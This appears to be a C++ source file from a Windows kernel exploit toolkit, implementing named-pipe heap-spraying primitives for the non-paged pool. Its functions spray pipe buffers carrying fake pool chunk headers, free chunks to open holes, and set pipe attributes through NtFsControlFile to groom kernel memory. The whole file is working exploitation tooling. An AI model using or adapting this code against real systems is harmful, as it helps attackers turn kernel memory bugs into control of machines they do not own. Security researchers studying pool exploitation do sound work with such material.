#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>
#include <map>
#include <vector>

#include "pipe_utils/pipe_utils.h"
#include "windows_api/windows_api.h"

std::map<size_t, std::vector<pipe_pair_t>> g_pipe_pool;
const size_t POOL_INCREMENT = 0x1000;

int SetPipeAttribute(pipe_pair_t* target_pipe, const char* data, size_t size)
{
    if (!target_pipe || !data)
        return 0;

    IO_STATUS_BLOCK status;
    char output[0x100];

    memset(output, 0x42, sizeof(output));

    NTSTATUS result = NtFsControlFile_(
        target_pipe->write,
        NULL,
        NULL,
        NULL,
        &status,
        0x11003C,
        (PVOID)data,
        size,
        output,
        sizeof(output));

    return NT_SUCCESS(result);
}

int writeDataToPipe(const pipe_pair_t* pipe_pair, const char* data, size_t bufsize)
{
    if (!pipe_pair || !data)
        return 0;

    DWORD resultLength = 0;

    return WriteFile(
        pipe_pair->write,
        data,
        bufsize,
        &resultLength,
        NULL);
}

int PeekDataFromPipe(const pipe_pair_t* pipe_pair, char* out, size_t bufsize)
{
    if (!pipe_pair || !out)
        return 0;

    DWORD resultLength = 0;

    return PeekNamedPipe(
        pipe_pair->read,
        out,
        bufsize,
        &resultLength,
        NULL,
        NULL);
}

int readDataFromPipe(const pipe_pair_t* pipe_pair, char* out, size_t bufsize)
{
    if (!pipe_pair || !out)
        return 0;

    DWORD resultLength = 0;

    return ReadFile(
        pipe_pair->read,
        out,
        bufsize,
        &resultLength,
        NULL);
}

int createPipePair(size_t block_size, pipe_pair_t* pipe_pair)
{
    if (!pipe_pair)
        return 0;

    if (!CreatePipe(&pipe_pair->read, &pipe_pair->write, NULL, PIPE_QUEUE_ENTRY_BUFSIZE(block_size)))
    {
        fprintf(stderr, "[-] Failed to create pipe pair: %lu\n", GetLastError());
        return 0;
    }
    return 1;
}

int replenishPool(size_t block_size)
{
    size_t initial_size = g_pipe_pool[block_size].size();
    g_pipe_pool[block_size].resize(initial_size + POOL_INCREMENT);

    for (size_t i = initial_size; i < g_pipe_pool[block_size].size(); i++)
    {
        createPipePair(block_size, &g_pipe_pool[block_size][i]);
    }
    return 1;
}

pipe_pair_t AllocNPPNxChunk(const vs_chunk_t* chunk, size_t block_size)
{
    // Check if block_size is too large
    if (block_size > 0x1000)
    {
        fprintf(stderr, "[-] Block size exceeds 0x1000 bytes limit\n");
        return { 0 };
    }

    // Check if we need to replenish the pool for this block size
    if (g_pipe_pool[block_size].empty())
    {
        replenishPool(block_size);
    }

    // Get a pipe from the pool
    pipe_pair_t pipe = g_pipe_pool[block_size].back();
    g_pipe_pool[block_size].pop_back();

    size_t bufsize = PIPE_QUEUE_ENTRY_BUFSIZE(block_size);

    char buffer[0x1000];
    memset(buffer, 0x41, bufsize);
    if (chunk)
    {
        memcpy(buffer, chunk, MIN(bufsize, sizeof(vs_chunk_t)));
    }

    writeDataToPipe(&pipe, buffer, bufsize);

    return pipe;
}

pipe_group_t* CreatePipeGroup(size_t nb, size_t block_size)
{
    pipe_group_t* pipe_group = (pipe_group_t*)malloc(sizeof(pipe_group_t) + (nb * sizeof(pipe_pair_t)));
    if (!pipe_group)
    {
        fprintf(stderr, "[-] Failed to allocate memory for pipe pool\n");
        return NULL;
    }

    pipe_group->nb = nb;
    pipe_group->block_size = block_size;
    return pipe_group;
}

pipe_group_t* SprayNPPNxChunks(size_t pipes_size, vs_chunk_t* chunk, size_t block_size)
{
    pipe_group_t* pool = CreatePipeGroup(pipes_size, block_size);

    for (size_t i = 0; i < pipes_size; i++)
    {
        pool->pipes[i] = AllocNPPNxChunk(chunk, block_size);
    }

    return pool;
}

int FreeNPPNxChunk(pipe_pair_t pipe, size_t block_size)
{
    size_t bufsize = PIPE_QUEUE_ENTRY_BUFSIZE(block_size);

    if (!pipe.write || !pipe.read || bufsize > 0x1000)
        return 0;

    char dummy_out_buf[0x1000];
    if (!readDataFromPipe(&pipe, dummy_out_buf, bufsize))
    {
        return 0;
    }

    g_pipe_pool[block_size].push_back(pipe);
    return 1;
}

int ClosePipePairHandles(pipe_pair_t* pipe_pair)
{
    if (pipe_pair->write && !CloseHandle(pipe_pair->write))
    {
        fprintf(stderr, "[-] Failed to close write pipe\n");
        return 0;
    }
    pipe_pair->write = NULL;

    if (pipe_pair->read && !CloseHandle(pipe_pair->read))
    {
        fprintf(stderr, "[-] Failed to close read pipe\n");
        return 0;
    }
    pipe_pair->read = NULL;

    return 1;
}

void DestroyPipeGroup(pipe_group_t* pipe_group)
{
    for (size_t i = 0; i < pipe_group->nb; i++)
    {
        if (pipe_group->pipes[i].read && pipe_group->pipes[i].write)
        {
            ClosePipePairHandles(&pipe_group->pipes[i]);
        }
    }
    free(pipe_group);
}
